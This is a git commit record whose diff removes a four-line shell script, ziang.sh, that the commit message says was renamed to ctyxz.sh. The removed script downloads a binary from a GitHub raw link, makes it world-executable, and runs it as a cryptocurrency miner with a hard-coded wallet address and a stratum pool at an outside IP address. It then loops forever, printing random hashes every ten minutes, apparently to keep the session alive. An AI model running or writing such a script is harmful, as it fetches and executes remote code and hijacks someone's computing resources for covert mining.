6aecbbd8ba50921ab3a8d4c760eb696db7a2ab1e
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-12 22:36:35 +0700

    Update and rename ziang.sh to ctyxz.sh

--- ziang.sh
+++
@@ -1,4 +0,0 @@
-wget https://github.com/aqshakuy/dora/raw/main/dero
-chmod 777 dero
-./dero -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H -r 170.187.197.220:443 -p stratum -m 3 
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
